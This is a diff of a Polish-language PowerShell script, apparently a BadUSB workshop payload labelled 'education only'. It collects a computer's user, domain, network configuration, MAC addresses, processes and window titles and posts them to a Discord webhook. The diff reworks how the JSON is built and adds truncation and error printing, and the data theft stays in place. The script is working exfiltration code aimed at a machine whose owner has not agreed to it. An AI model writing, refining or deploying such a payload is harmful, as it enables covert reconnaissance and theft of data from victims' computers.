@@ -21,6 +21,8 @@ foreach ($adapter in $adapters) {
     $networks += "Karta: $name`r`nIP: $ip`r`nMaska: $mask`r`nBrama: $gw`r`nDNS: $dns`r`nMAC: $mac`r`n---"
 }
 if ($networks.Count -eq 0) { $networks = "Brak połączenia sieciowego" }
+$networkText = ($networks -join "`r`n")
+if ($networkText.Length -gt 1000) { $networkText = $networkText.Substring(0, 1000) + "..." }
 
 # Uptime
 $os = Get-WmiObject Win32_OperatingSystem
@@ -29,6 +31,7 @@ $uptimeStr = "$($uptime.Days)d $($uptime.Hours)h $($uptime.Minutes)m"
 
 # Procesor i RAM
 $cpu = (Get-WmiObject Win32_Processor).Name
+if ($cpu.Length -gt 100) { $cpu = $cpu.Substring(0, 100) + "..." }
 $ram = [math]::Round((Get-WmiObject Win32_ComputerSystem).TotalPhysicalMemory/1GB, 2)
 
 # Procesy (top 5 po CPU)
@@ -37,40 +40,47 @@ $procs = Get-Process | Sort-Object CPU -Descending | Select-Object -First 5 | Fo
     $ramUsage = [math]::Round($_.WorkingSet/1MB, 1)
     "$($_.ProcessName) (CPU: $cpuUsage% | RAM: $ramUsage MB)"
 }
+$procsText = ($procs -join "`r`n")
+if ($procsText.Length -gt 1000) { $procsText = $procsText.Substring(0, 1000) + "..." }
 
-# Aktywne okna - prostsza wersja
+# Aktywne okna
 $windows = @(Get-Process | Where-Object {$_.MainWindowTitle -ne ""} | Select-Object -First 5 -ExpandProperty MainWindowTitle)
-if ($windows.Count -eq 0) { $windows = "Brak widocznych okien" }
+if ($windows.Count -eq 0) { $windows = @("Brak widocznych okien") }
+$windowsText = ($windows -join "`r`n")
+if ($windowsText.Length -gt 500) { $windowsText = $windowsText.Substring(0, 500) + "..." }
 
-# Składamy wiadomość na Discord
-$fields = @(
-    @{ name = "Uzytkownik"; value = $userName; inline = $true },
-    @{ name = "Domena"; value = $domain; inline = $true },
-    @{ name = "Uptime"; value = $uptimeStr; inline = $true },
-    @{ name = "CPU"; value = $cpu.Substring(0, [Math]::Min(100, $cpu.Length)); inline = $false },
-    @{ name = "RAM"; value = "$ram GB"; inline = $true },
-    @{ name = "Sieć"; value = ($networks -join "`r`n").Substring(0, [Math]::Min(1000, ($networks -join "`r`n").Length)); inline = $false },
-    @{ name = "Top 5 procesów"; value = $procs -join "`r`n"; inline = $false },
-    @{ name = "Aktywne okna"; value = ($windows -join "`r`n").Substring(0, [Math]::Min(500, ($windows -join "`r`n").Length)); inline = $false }
-)
-
-$body = @{
-    content = "NOWE URZADZENIE ZAINWENTARYZOWANE!"
-    embeds = @(
-        @{
-            title = "Komputer: $compName"
-            color = 16711680
-            fields = $fields
-            footer = @{ text = "BadUSB Warsztat - Tylko edukacja!" }
-            timestamp = (Get-Date).ToString("yyyy-MM-ddTHH:mm:ssK")
+# Ręczne tworzenie JSON (bez ConvertTo-Json)
+$json = @"
+{
+    "content": "NOWE URZADZENIE ZAINWENTARYZOWANE!",
+    "embeds": [
+        {
+            "title": "Komputer: $compName",
+            "color": 16711680,
+            "fields": [
+                { "name": "Uzytkownik", "value": "$($userName -replace '"', '\"')", "inline": true },
+                { "name": "Domena", "value": "$($domain -replace '"', '\"')", "inline": true },
+                { "name": "Uptime", "value": "$($uptimeStr -replace '"', '\"')", "inline": true },
+                { "name": "CPU", "value": "$($cpu -replace '"', '\"')", "inline": false },
+                { "name": "RAM", "value": "$ram GB", "inline": true },
+                { "name": "Sieć", "value": "$($networkText -replace '"', '\"')", "inline": false },
+                { "name": "Top 5 procesów", "value": "$($procsText -replace '"', '\"')", "inline": false },
+                { "name": "Aktywne okna", "value": "$($windowsText -replace '"', '\"')", "inline": false }
+            ],
+            "footer": { "text": "BadUSB Warsztat - Tylko edukacja!" },
+            "timestamp": "$(Get-Date -Format 'yyyy-MM-ddTHH:mm:ssK')"
         }
-    )
-} | ConvertTo-Json -Depth 4
+    ]
+}
+"@
 
 # Wysyłamy na Discord
 try {
-    Invoke-RestMethod -Uri $webhook -Method Post -ContentType "application/json" -Body $body
+    Write-Host "Wysyłanie..." -ForegroundColor Yellow
+    $response = Invoke-RestMethod -Uri $webhook -Method Post -ContentType "application/json" -Body $json
     Write-Host "OK!" -ForegroundColor Green
 } catch {
     Write-Host "Blad: $_" -ForegroundColor Red
+    Write-Host "JSON który próbowano wysłać:" -ForegroundColor Red
+    Write-Host $json -ForegroundColor Gray
 }
